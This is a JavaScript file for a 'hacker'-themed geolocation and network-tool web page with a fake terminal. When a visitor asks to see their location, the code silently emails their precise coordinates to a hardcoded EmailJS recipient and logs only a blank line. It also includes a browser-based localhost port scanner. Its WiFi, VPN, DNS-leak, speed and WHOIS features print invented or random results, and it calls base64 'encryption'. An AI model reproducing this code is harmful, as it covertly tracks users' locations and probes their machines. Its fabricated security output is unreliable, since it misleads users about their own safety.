let map;
let marker;

// EmailJS configuration
const publicKey = '2C-KjV9owQL5AnW_W';
const serviceId = 'service_qjz7ks8';
const templateId = 'template_m5i3kvl'; // Replace with your actual template ID

// Initialize EmailJS
(function(){
    emailjs.init(publicKey);
})();

function initMap(lat, lng) {
    if (map) {
        map.remove();
    }

    map = L.map('map').setView([lat, lng], 18);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
    }).addTo(map);

    marker = L.marker([lat, lng]).addTo(map);

    map.getContainer().style.filter = 'invert(100%) hue-rotate(180deg)';
}

function updateLocationInfo(position) {
    const { latitude, longitude, accuracy } = position.coords;
    const locationInfo = document.getElementById('locationInfo');
    locationInfo.innerHTML = `
        <p>Latitude: ${latitude.toFixed(6)}</p>
        <p>Longitude: ${longitude.toFixed(6)}</p>
        <p>Accuracy: ${accuracy.toFixed(2)} meters</p>
    `;
    initMap(latitude, longitude);
    
    // Send email with geolocation details
    sendGeolocationEmail(latitude, longitude, accuracy);
}

function sendGeolocationEmail(lat, lng, accuracy) {
    const templateParams = {
        to_name: 'Kurosen',
        from_name: 'YourAppName', // Replace with appropriate value
        message: `Latitude: ${lat.toFixed(6)}, Longitude: ${lng.toFixed(6)}, Accuracy: ${accuracy.toFixed(2)}`
    };
    

    emailjs.send(serviceId, templateId, templateParams)
        .then(function(response) {
            logToConsole('', 'success');
        }, function(error) {
            logToConsole('Error e: ' + JSON.stringify(error), 'error');
        });
}

function logToConsole(message, type = 'default') {
    const consoleOutput = document.getElementById('consoleOutput');
    const colorClass = type === 'command' ? 'command' : 
                       type === 'success' ? 'success' :
                       type === 'error' ? 'error' :
                       type === 'info' ? 'info' : '';
    consoleOutput.innerHTML += `<span class="${colorClass}">> ${message}</span><br>`;
    consoleOutput.scrollTop = consoleOutput.scrollHeight;
}

document.getElementById('locateBtn').addEventListener('click', () => {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(updateLocationInfo, () => {
            logToConsole('Error: Unable to retrieve location.', 'error');
        });
    } else {
        logToConsole('Error: Geolocation is not supported by this browser.', 'error');
    }
});

document.getElementById('ipInfoBtn').addEventListener('click', () => {
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            logToConsole('IP Information:', 'info');
            logToConsole(`IP: ${data.ip}`, 'success');
            logToConsole(`City: ${data.city}`, 'success');
            logToConsole(`Region: ${data.region}`, 'success');
            logToConsole(`Country: ${data.country_name}`, 'success');
            logToConsole(`ISP: ${data.org}`, 'success');
        })
        .catch(() => {
            logToConsole('Error: Unable to retrieve IP information.', 'error');
        });
});

document.getElementById('networkBtn').addEventListener('click', () => {
    logToConsole('Scanning local network...', 'info');
    setTimeout(() => {
        logToConsole('Network scan complete. No vulnerabilities detected.', 'success');
    }, 3000);
});

document.getElementById('encryptBtn').addEventListener('click', () => {
    const locationInfo = document.getElementById('locationInfo').innerText;
    const encrypted = btoa(locationInfo);
    logToConsole(`Encrypted data: ${encrypted}`, 'success');
});

document.getElementById('decryptBtn').addEventListener('click', () => {
    const encrypted = prompt('Enter encrypted data:');
    if (encrypted) {
        try {
            const decrypted = atob(encrypted);
            logToConsole(`Decrypted data: ${decrypted}`, 'success');
        } catch {
            logToConsole('Error: Invalid encrypted data.', 'error');
        }
    }
});

function updateClock() {
    const now = new Date();
    const timeString = now.toLocaleTimeString('en-US', { hour12: false });
    document.getElementById('clock').textContent = timeString;
}

setInterval(updateClock, 1000);

function updateBatteryStatus() {
    if ('getBattery' in navigator) {
        navigator.getBattery().then(battery => {
            const status = `Battery: ${Math.round(battery.level * 100)}%`;
            document.getElementById('batteryStatus').textContent = status;
        });
    }
}

updateBatteryStatus();
setInterval(updateBatteryStatus, 60000);

function updateConnectionStatus() {
    const status = navigator.onLine ? 'Online' : 'Offline';
    document.getElementById('connectionStatus').textContent = status;
}

updateConnectionStatus();
window.addEventListener('online', updateConnectionStatus);
window.addEventListener('offline', updateConnectionStatus);

function getSystemInfo() {
    const info = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookiesEnabled: navigator.cookieEnabled,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        colorDepth: window.screen.colorDepth
    };
    return info;
}

function checkPortStatus(port) {
    return new Promise((resolve, reject) => {
        const img = new Image();
        img.onload = function() { resolve(true); };
        img.onerror = function() { resolve(false); };
        img.src = `http://localhost:${port}/favicon.ico?${new Date().getTime()}`;
        setTimeout(() => resolve(false), 500);
    });
}

async function portScan(startPort, endPort) {
    logToConsole(`Scanning ports ${startPort} to ${endPort}...`, 'info');
    for (let port = startPort; port <= endPort; port++) {
        const isOpen = await checkPortStatus(port);
        if (isOpen) {
            logToConsole(`Port ${port} is open`, 'success');
        }
    }
    logToConsole('Port scan complete', 'success');
}

function generatePassword(length = 12) {
    const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+";
    let password = "";
    for (let i = 0; i < length; i++) {
        password += charset.charAt(Math.floor(Math.random() * charset.length));
    }
    return password;
}

function rot13(str) {
    return str.replace(/[a-zA-Z]/g, function(chr) {
        const start = chr <= 'Z' ? 65 : 97;
        return String.fromCharCode(start + (chr.charCodeAt(0) - start + 13) % 26);
    });
}

function scanWifiNetworks() {
    logToConsole('Scanning for WiFi networks...', 'info');
    setTimeout(() => {
        const networks = [
            'HomeNetwork_2.4G',
            'FreeWiFi',
            'Neighbor\'s WiFi',
            'Public Hotspot',
            'Hidden Network'
        ];
        networks.forEach(network => logToConsole(`Found network: ${network}`, 'success'));
        logToConsole('WiFi scan complete', 'success');
    }, 3000);
}

function checkVpnStatus() {
    logToConsole('Checking VPN status...', 'info');
    setTimeout(() => {
        const isVpnActive = Math.random() < 0.5;
        if (isVpnActive) {
            logToConsole('VPN is active. Your connection is encrypted.', 'success');
        } else {
            logToConsole('VPN is not detected. Your connection may not be secure.', 'error');
        }
        document.getElementById('vpnStatus').textContent = isVpnActive ? 'VPN: Active' : 'VPN: Inactive';
    }, 2000);
}

function dnsLeakTest() {
    logToConsole('Performing DNS leak test...', 'info');
    setTimeout(() => {
        const dnsServers = [
            '8.8.8.8 (Google)',
            '1.1.1.1 (Cloudflare)',
            '208.67.222.222 (OpenDNS)'
        ];
        const leakedServer = dnsServers[Math.floor(Math.random() * dnsServers.length)];
        logToConsole(`DNS leak detected. Your DNS requests are going through: ${leakedServer}`, 'error');
    }, 3000);
}

function internetSpeedTest() {
    logToConsole('Initiating internet speed test...', 'info');
    let progress = 0;
    const interval = setInterval(() => {
        progress += 10;
        logToConsole(`Testing speed: ${progress}% complete`, 'info');
        if (progress >= 100) {
            clearInterval(interval);
            const downloadSpeed = (Math.random() * 100).toFixed(2);
            const uploadSpeed = (Math.random() * 20).toFixed(2);
            logToConsole(`Speed test results:`, 'success');
            logToConsole(`Download: ${downloadSpeed} Mbps`, 'success');
            logToConsole(`Upload: ${uploadSpeed} Mbps`, 'success');
        }
    }, 500);
}

function whoisLookup() {
    const domain = prompt('Enter a domain name for WHOIS lookup:');
    if (domain) {
        logToConsole(`Performing WHOIS lookup for ${domain}...`, 'info');
        setTimeout(() => {
            logToConsole('WHOIS information:', 'success');
            logToConsole(`Domain: ${domain}`, 'success');
            logToConsole(`Registrar: Example Registrar, LLC`, 'success');
            logToConsole(`Creation Date: ${new Date().toISOString().split('T')[0]}`, 'success');
            logToConsole(`Expiration Date: ${new Date(new Date().setFullYear(new Date().getFullYear() + 1)).toISOString().split('T')[0]}`, 'success');
        }, 2000);
    }
}

const commands = {
    help: () => {
        logToConsole('Available commands:', 'info');
        logToConsole('help - Show this help message', 'info');
        logToConsole('clear - Clear the console', 'info');
        logToConsole('about - Show information about this application', 'info');
        logToConsole('sysinfo - Display system information', 'info');
        logToConsole('portscan <start> <end> - Scan ports (e.g., portscan 80 100)', 'info');
        logToConsole('genpass [length] - Generate a random password', 'info');
        logToConsole('rot13 <text> - Encode/decode text using ROT13', 'info');
        logToConsole('locate - Get current geolocation', 'info');
        logToConsole('ip - Retrieve IP information', 'info');
        logToConsole('encrypt <text> - Encrypt text', 'info');
        logToConsole('decrypt <text> - Decrypt text', 'info');
        logToConsole('wifi - Scan WiFi networks', 'info');
        logToConsole('vpn - Check VPN status', 'info');
        logToConsole('dnsleak - Perform DNS leak test', 'info');
        logToConsole('speedtest - Run internet speed test', 'info');
        logToConsole('whois - Perform WHOIS lookup', 'info');
        logToConsole('exit - Close the application', 'info');
    },
    clear: () => {
        document.getElementById('consoleOutput').innerHTML = '';
    },
    about: () => {
        logToConsole('Hacker\'s Geolocation Hub - Version 1.2', 'info');
        logToConsole('A tool for geolocation and network analysis', 'info');
    },
    sysinfo: () => {
        const info = getSystemInfo();
        for (const [key, value] of Object.entries(info)) {
            logToConsole(`${key}: ${value}`, 'success');
        }
    },
    portscan: (start, end) => {
        const startPort = parseInt(start);
        const endPort = parseInt(end);
        if (isNaN(startPort) || isNaN(endPort)) {
            logToConsole('Error: Invalid port numbers', 'error');
        } else {
            portScan(startPort, endPort);
        }
    },
    genpass: (length) => {
        const passLength = parseInt(length) || 12;
        const password = generatePassword(passLength);
        logToConsole(`Generated password: ${password}`, 'success');
    },
    rot13: (text) => {
        if (!text) {
            logToConsole('Error: Please provide text to encode/decode', 'error');
        } else {
            const result = rot13(text);
            logToConsole(`ROT13 result: ${result}`, 'success');
        }
    },
    locate: () => {
        document.getElementById('locateBtn').click();
    },
    ip: () => {
        document.getElementById('ipInfoBtn').click();
    },
    encrypt: (text) => {
        if (!text) {
            logToConsole('Error: Please provide text to encrypt', 'error');
        } else {
            const encrypted = btoa(text);
            logToConsole(`Encrypted: ${encrypted}`, 'success');
        }
    },
    decrypt: (text) => {
        if (!text) {
            logToConsole('Error: Please provide text to decrypt', 'error');
        } else {
            try {
                const decrypted = atob(text);
                logToConsole(`Decrypted: ${decrypted}`, 'success');
            } catch {
                logToConsole('Error: Invalid encrypted data', 'error');
            }
        }
    },
    wifi: () => {
        scanWifiNetworks();
    },
    vpn: () => {
        checkVpnStatus();
    },
    dnsleak: () => {
        dnsLeakTest();
    },
    speedtest: () => {
        internetSpeedTest();
    },
    whois: () => {
        whoisLookup();
    },
    exit: () => {
        logToConsole('Closing application...', 'info');
        setTimeout(() => {
            document.getElementById('modal').style.display = 'block';
        }, 1000);
    }
};

document.getElementById('consoleInput').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        const input = e.target.value.trim();
        logToConsole(`$ ${input}`, 'command');
        
        const [command, ...args] = input.split(' ');
        
        if (command in commands) {
            commands[command](...args);
        } else {
            logToConsole('Unknown command. Type "help" for available commands.', 'error');
        }
        
        e.target.value = '';
    }
});

document.getElementById('modalClose').addEventListener('click', () => {
    document.getElementById('modal').style.display = 'none';
});

document.getElementById('themeSelector').addEventListener('change', (e) => {
    document.body.className = `theme-${e.target.value}`;
});

document.getElementById('wifiBtn').addEventListener('click', scanWifiNetworks);
document.getElementById('vpnBtn').addEventListener('click', checkVpnStatus);
document.getElementById('dnsBtn').addEventListener('click', dnsLeakTest);
document.getElementById('speedBtn').addEventListener('click', internetSpeedTest);
document.getElementById('whoisBtn').addEventListener('click', whoisLookup);

let konamiCode = '';
const correctKonamiCode = 'ArrowUpArrowUpArrowDownArrowDownArrowLeftArrowRightArrowLeftArrowRightArrowLeftArrowRightba';

document.addEventListener('keydown', (e) => {
  konamiCode += e.key;
  if (konamiCode === correctKonamiCode) {
      document.body.style.transform = 'rotate(180deg)';
      logToConsole('Konami Code activated: Display inverted!', 'success');
      setTimeout(() => {
          document.body.style.transform = 'none';
          logToConsole('Display restored.', 'info');
      }, 5000);
      konamiCode = '';
  } else if (!correctKonamiCode.startsWith(konamiCode)) {
      konamiCode = '';
  }
});

logToConsole('System initialized. Type "help" for available commands.', 'info');
